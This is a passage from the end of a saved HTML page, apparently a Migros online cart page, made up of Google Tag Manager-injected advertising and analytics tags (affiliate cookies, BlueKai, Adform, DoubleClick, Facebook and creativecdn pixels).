          document.cookie = a + "\x3d" + c + b + "; SameSite\x3dLax;secure; path\x3d/;" + f
        }

        function h(a) {
          var c = "true" == a.lastclick ? "lc_pfx" : "pc_pfx",
            b = "true" == a.lastclick ? "pfx_lastclick" : "pfx_postclick";
          "false" == a.lastclick && d()[a.variable] == a.source && (e(b, "gelirortaklari", a.cookieWindow), d().pfx && e(c, d().pfx, a.cookieWindow));
          "true" == a.lastclick && (d()[a.variable] ? (e(b, d()[a.variable], a.cookieWindow), d().pfx ? e(c, d().pfx, a.cookieWindow) : (a = c, c = "domain\x3d" + location.hostname.replace(/^www\./i, "") + ";", b = new Date, b.setTime(b.getTime() - 864E5), b = "; expires\x3d" + b.toGMTString(), document.cookie = a + "\x3d" + b + "; SameSite\x3dLax;secure; path\x3d/;" + c)) : d().gclid && e(b, "adwords", 1))
        }(function() {
          var a = document.getElementById("pfx_ap");
          if (void 0 === a || null == a) {
            a = document.createElement("script");
            a.type = "text/javascript";
            a.id = "pfx_ap";
            a.async = !0;
            a.src = "//img2-digitouch.mncdn.com/include/dynamic_click_tag.js";
            var c = document.getElementsByTagName("script")[0];
            c.parentNode.insertBefore(a, c)
          }
        })();
        var k = {
          variable: "utm_source",
          source: "performics",
          lastclick: "false",
          cookieWindow: 7
        };
        h(k)
      })();
    </script>
    <script type="text/javascript" id="">
      if (google_tag_manager["rm"]["11483837"](211)) {
        var bkPush = document.createElement("img");
        bkPush.setAttribute("src", "https://stags.bluekai.com/site/85196?e_id_s\x3d" + google_tag_manager["rm"]["11483837"](212));
        bkPush.setAttribute("width", "1");
        bkPush.setAttribute("height", "1");
        document.body.appendChild(bkPush)
      };
    </script>
    <script type="text/javascript" id="">
      window._adftrack = Array.isArray(window._adftrack) ? window._adftrack : window._adftrack ? [window._adftrack] : [];
      window._adftrack.push({
        HttpHost: "track.adform.net",
        pm: 2443498,
        divider: encodeURIComponent("|"),
        pagename: encodeURIComponent("Tum_sayfalar")
      });
      (function() {
        var a = document.createElement("script");
        a.type = "text/javascript";
        a.async = !0;
        a.src = "https://s2.adform.net/banners/scripts/st/trackpoint-async.js";
        var b = document.getElementsByTagName("script")[0];
        b.parentNode.insertBefore(a, b)
      })();
    </script>
    <noscript>
      <p style="margin:0;padding:0;border:0;">
        <img src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Tum_sayfalar&amp;ADFdivider=|" width="1" height="1" alt="">
      </p>
    </noscript>
    <iframe height="0" width="0" style="display: none; visibility: hidden;" src="https://10610902.fls.doubleclick.net/activityi;src=10610902;type=basket;cat=msm-b0;ord=5127935762438;npa=0;auiddc=37027196.1709149487;u14=%2Fsepetim;u16=Cart;u20=undefined;ps=1;pcor=694782972;pscdl=noapi;gtm=45fe42q1z8811483837za201;gcs=G111;gcd=13n3n3l3l5;dma=0;uaa=x86;uab=64;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;epver=2;~oref=https%3A%2F%2Fwww.migros.com.tr%2Fsepetim?"></iframe>
    <iframe allow="join-ad-interest-group" data-tagging-id="DC-10610902/basket/msm-b0+standard" data-load-time="1709167808794" height="0" width="0" style="display: none; visibility: hidden;" src="https://td.doubleclick.net/td/fls/rul/activityi;fledge=1;src=10610902;type=basket;cat=msm-b0;ord=5127935762438;npa=0;auiddc=37027196.1709149487;u14=%2Fsepetim;u16=Cart;u20=undefined;ps=1;pcor=694782972;pscdl=noapi;gtm=45fe42q1z8811483837za201;gcs=G111;gcd=13n3n3l3l5;dma=0;uaa=x86;uab=64;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;epver=2;~oref=https%3A%2F%2Fwww.migros.com.tr%2Fsepetim?"></iframe>
    <script type="text/javascript" id="">
      (function() {
        var b = document.getElementsByTagName("head")[0],
          a = document.createElement("script");
        a.async = !0;
        a.src = "https://tags.bluekai.com/site/83669?ret\x3djs\x26limit\x3d1";
        b.appendChild(a)
      })();
    </script>
    <script type="text/javascript" id="">
      String.prototype.turkishtoEnglish = function() {
        return this.replace("\u011e", "g").replace("\u00dc", "u").replace("\u015e", "s").replace("I", "i").replace("\u0130", "i").replace("\u00d6", "o").replace("\u00c7", "c").replace("\u011f", "g").replace("\u00fc", "u").replace("\u015f", "s").replace("\u0131", "i").replace("\u00f6", "o").replace("\u00e7", "c")
      };
      String.prototype.bluekaienc = function() {
        return encodeURI(this.turkishtoEnglish().toLowerCase().replace(" ", "_"))
      };
      (function() {
        var b = document.getElementsByTagName("body")[0],
          a = document.createElement("script");
        a.async = !0;
        a.src = "https://tags.bkrtx.com/js/bk-coretag.js";
        b.appendChild(a)
      })();
    </script>
    <script async="" src="https://tags.bkrtx.com/js/bk-coretag.js"></script>
    <script type="text/javascript" id="">
      window.bk_async = function() {
        bk_addPageCtx("e_id_m", google_tag_manager["rm"]["11483837"](310));
        BKTAG.doTag(84003, 10)
      };
    </script>
    <script type="text/javascript" id="">
      var pPath = google_tag_manager["rm"]["11483837"](311),
        sQuery = google_tag_manager["rm"]["11483837"](312),
        r = google_tag_manager["rm"]["11483837"](313) + "?q\x3d" + google_tag_manager["rm"]["11483837"](314);
      "/arama" == google_tag_manager["rm"]["11483837"](315) ? localStorage.setItem("pPath_sQuery", google_tag_manager["rm"]["11483837"](316) + "?q\x3d" + google_tag_manager["rm"]["11483837"](317)) : localStorage.setItem("pPath_sQuery", google_tag_manager["rm"]["11483837"](318));
    </script>
    <script type="text/javascript" id="">
      fbq("track", "PageView");
    </script>
    <script type="text/javascript" id="">
      var pcode = "https://creativecdn.com/tags?id\x3d" + google_tag_manager["rm"]["11483837"](321) + "\x26amp;ncm\x3d1";
      (function(b, d) {
        var c = "creativecdnIframe",
          a = document.getElementById(c);
        a && a.parentNode.removeChild(a);
        a = b.createElement("iframe");
        a.src = d;
        a.id = c;
        a.style.width = "1px";
        a.style.height = "1px";
        a.style.display = "none";
        b.body.appendChild(a)
      })(document, pcode);
    </script>
    <iframe src="https://creativecdn.com/tags?id=pr_U1qof8QEUsd2Zj95oDXI&amp;amp;ncm=1" id="creativecdnIframe" style="width: 1px; height: 1px; display: none;"></iframe>
    <script type="text/javascript" id="">
      (function() {
        function d() {
          var a = {};
          window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(c, b, f) {
            a[b] = f
          });
          return a
        }

        function e(a, c, b) {
          if (b) {
            var f = "domain\x3d" + location.hostname.replace(/^www\./i, "") + ";",
              g = new Date;
            g.setTime(g.getTime() + 864E5 * b);
            b = "; expires\x3d" + g.toGMTString()
          } else b = "";
          document.cookie = a + "\x3d" + c + b + "; SameSite\x3dLax;secure; path\x3d/;" + f
        }

        function h(a) {
          var c = "true" == a.lastclick ? "lc_pfx" : "pc_pfx",
            b = "true" == a.lastclick ? "pfx_lastclick" : "pfx_postclick";
          "false" == a.lastclick && d()[a.variable] == a.source && (e(b, "gelirortaklari", a.cookieWindow), d().pfx && e(c, d().pfx, a.cookieWindow));
          "true" == a.lastclick && (d()[a.variable] ? (e(b, d()[a.variable], a.cookieWindow), d().pfx ? e(c, d().pfx, a.cookieWindow) : (a = c, c = "domain\x3d" + location.hostname.replace(/^www\./i, "") + ";", b = new Date, b.setTime(b.getTime() - 864E5), b = "; expires\x3d" + b.toGMTString(), document.cookie = a + "\x3d" + b + "; SameSite\x3dLax;secure; path\x3d/;" + c)) : d().gclid && e(b, "adwords", 1))
        }(function() {
          var a = document.getElementById("pfx_ap");
          if (void 0 === a || null == a) {
            a = document.createElement("script");
            a.type = "text/javascript";
            a.id = "pfx_ap";
            a.async = !0;
            a.src = "//img2-digitouch.mncdn.com/include/dynamic_click_tag.js";
            var c = document.getElementsByTagName("script")[0];
            c.parentNode.insertBefore(a, c)
          }
        })();
        var k = {
          variable: "utm_source",
          source: "performics",
          lastclick: "false",
          cookieWindow: 7
        };
        h(k)
      })();
    </script>
    <script type="text/javascript" id="">
      if (google_tag_manager["rm"]["11483837"](322)) {
        var bkPush = document.createElement("img");
        bkPush.setAttribute("src", "https://stags.bluekai.com/site/85196?e_id_s\x3d" + google_tag_manager["rm"]["11483837"](323));
        bkPush.setAttribute("width", "1");
        bkPush.setAttribute("height", "1");
        document.body.appendChild(bkPush)
      };
    </script>
    <script type="text/javascript" id="">
      window._adftrack = Array.isArray(window._adftrack) ? window._adftrack : window._adftrack ? [window._adftrack] : [];
      window._adftrack.push({
        HttpHost: "track.adform.net",
        pm: 2443498,
        divider: encodeURIComponent("|"),
        pagename: encodeURIComponent("Tum_sayfalar")
      });
      (function() {
        var a = document.createElement("script");
        a.type = "text/javascript";
        a.async = !0;
        a.src = "https://s2.adform.net/banners/scripts/st/trackpoint-async.js";
        var b = document.getElementsByTagName("script")[0];
        b.parentNode.insertBefore(a, b)
      })();
    </script>
    <noscript>
      <p style="margin:0;padding:0;border:0;">
        <img src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Tum_sayfalar&amp;ADFdivider=|" width="1" height="1" alt="">
      </p>
    </noscript>
    <script type="text/javascript" id="">
      window._adftrack = Array.isArray(window._adftrack) ? window._adftrack : window._adftrack ? [window._adftrack] : [];
      window._adftrack.push({
        HttpHost: "track.adform.net",
        pm: 2443498,
        divider: encodeURIComponent("|"),
        pagename: encodeURIComponent("Login_olanlar")
      });
      (function() {
        var a = document.createElement("script");
        a.type = "text/javascript";
        a.async = !0;
        a.src = "https://s2.adform.net/banners/scripts/st/trackpoint-async.js";
        var b = document.getElementsByTagName("script")[0];
        b.parentNode.insertBefore(a, b)
      })();
    </script>
    <noscript>
      <p style="margin:0;padding:0;border:0;">
        <img src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Login_olanlar&amp;ADFdivider=|" width="1" height="1" alt="">
      </p>
    </noscript>
    <script type="text/javascript" src="assets/imask/imask.min.js"></script>
  </body>
</html>